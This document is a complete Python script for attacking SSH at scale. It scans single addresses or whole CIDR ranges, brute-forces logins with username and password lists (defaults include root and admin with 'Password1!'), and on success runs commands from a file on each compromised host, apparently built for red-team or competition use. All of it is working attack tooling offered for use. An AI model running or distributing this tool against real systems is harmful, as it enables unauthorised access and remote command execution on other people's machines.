#!/usr/bin/python3

from termcolor import colored #
from netaddr import IPNetwork #
from queue import Queue
import threading
import paramiko #
import argparse #
import socket
import time
import sys
import os


# get commandline args
parser = argparse.ArgumentParser(description='Allows simplified SSH attacking against a network full of bad ssh passwords and users')
parser.add_argument('-a','--address', type=str, help='Network Address to attack (Accepts CIDR for full network or single address)')
parser.add_argument('-aF','--addfile', type=str, help='Specify a file with addresses to attack (Accepts CIDR)')
parser.add_argument('-t','--threads', type=int, help='Specify the amount of threads to use for the attack',default=1)
parser.add_argument('--noscan', action='store_true', help='Avoid scanning the addresses before attacking')
parser.add_argument('-v', '--verbose', action='store_true', help='Print all errors generated from SSH')
parser.add_argument('--users', type=str, help='Specify a file with a list of usernames to attack with')
parser.add_argument('--passwords', type=str, help='Specify a file with passwords to attack with')
parser.add_argument('-o','-O', type=str, help='Specify outfile to write successful targets')
parser.add_argument('-c','-C', type=str, help='Specify a file with commands to execute')
parser.add_argument('-p','-P', type=int, help='Port for the scanner to detect ssh on', default=22)
parser.add_argument('--test', action='store_true', help='Used for debugging')
args = parser.parse_args()
notify = colored("[*] ", 'yellow')
good_n = colored("[+] ", 'green')
bad_n = colored("[-] ", 'red')

def threader():
    global possible_subnet_list
    global targets
    global port
    global args

    while True:
        worker = q.get()
        attack(possible_subnet_list[int(worker)])
        q.task_done()

#################################################################
# Global Stuff
possible_subnet_list = []
port = args.p
targets = []
shells = []

print_lock = threading.Lock()
q = Queue()
for x in range(args.threads):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

start = time.time()

# Set up usernames to use
if(args.users == None):
    usernames = ['root', 'dsu', 'admin']
else:
    with print_lock:
        with open(args.users) as f:
            usernames = f.read().splitlines()
        f.close()

# Set up passwords to use
if(args.passwords == None):
    passwords = ['Password1!']
else:
    with print_lock:
        with open(args.passwords) as f:
            passwords = f.read().splitlines()
# Set up commands to use
if(args.c == None):
    commands = 'touch HelloWorld'
else:
    with print_lock:
        with open(args.c) as f:
            commands = f.read()
#################################################################

class shell:
    def __init__(self, host, user, psw, prt):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh.connect(host, username=user, password=psw, port=prt)

    def __del__(self):
        self.ssh.close()

    # Command Handler
    @staticmethod
    def command(self, cmd):
        stdin, stdout, stderr = self.ssh.exec_command(cmd)


def attack(target):
    global possible_subnet_list
    global usernames
    global passwords
    global commands
    global targets
    global shells
    global port
    global args

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)

    try:
        # Scan target before attacking if not noscan options
        if(args.noscan == None):
            con = s.connect((str(target),int(port)))
            with print_lock:
                targets.append(str(target))
            con.close()

        # Time to try to get some ssh sessions
        with print_lock:
            sys.stdout.write(" - {} attemping...\n".format(str(target)))
        for user in usernames: # Attempt each username
            for password in passwords: # attempt each password
                try: # if it succeeds, then leave the for
                    s = shell(str(target), user, password, port)
                    with print_lock:
                        shells.append(s)
                        sys.stdout.write(good_n + "Shell opened on {}@{}\n".format(user,str(target)))
                        s.command(s,commands)
                    break
                except Exception as e: # if it fails then, move on to the next username || password
                    if args.v:
                        print(e)
                    pass
    except:
        pass

def main():
    global possible_subnet_list
    global targets
    global port
    global args

    # Check if they want to use a file of addresses
    if(args.addfile == None):
        # Calculate non-file address
        if(args.address == None):
            with print_lock:
                sys.stderr.write(bad_n + "need an address to work with (-a)\nExiting...\n")
            exit(403)
        else:
            # Calculate addresses
            populate_address(args.address)
    # Use address file instead
    else:
        try:
            with open(args.addfile,"r") as targs:
                with print_lock:
                    sys.stdout.write(notify + "running with address file!\n")
                for line in targs:
                    populate_address(line)
            targs.close()
        except:
            with print_lock:
                sys.write(bad + "could not open that file.")
            exit()

    # Remove blank list entries. <3 nano users
    possible_subnet_list = list(filter(None, possible_subnet_list))

    # EXIT FOR TESTING
    if(args.test == True):
        print(possible_subnet_list)
        exit()

    # Feed the thread monsters
    for address_index in range(0,len(possible_subnet_list)):
        q.put(address_index)
    q.join()

    # Report if no hosts were up
    if None in targets:
        with print_lock:
            sys.stderr.write(bad_n + "No SSH found!\nExiting...\n")
        exit(404)

    if(args.o != None):
        with print_lock:
            sys.stdout.write(notify + "Writing found targets to {}\n".format(args.o))
        f = open(args.o,"w+")
        for t in targets:
            f.write(t + "\n")
        f.close()

    with print_lock:
        sys.stdout.write("\nThat's all I can do!\n")
        print("Attack lasted {:.2f} seconds!".format(time.time() - start))

def calculate_targets(address):
    ''' Assumes a CIDR address and calculates IPNetwork '''
    global possible_subnet_list

    for a in IPNetwork(address):
        possible_subnet_list.append(str(a))

def populate_address(address):
    ''' Takes care of adding address or cidr addresses to list '''
    global possible_subnet_list

    # Clear out any newlines and add the addresses
    cleanedAdd = address.split('\n')[0]
    # SINGLE MODE #
    if('/' not in cleanedAdd):
        possible_subnet_list.append(cleanedAdd)
    # MULTI addresses #
    else:
        calculate_targets(cleanedAdd)

try:
    main()
except KeyboardInterrupt:
    with print_lock:
        sys.stderr.write("\nNO! PUT THE KNIFE DOWN! AHHggGGGgggg...\n")


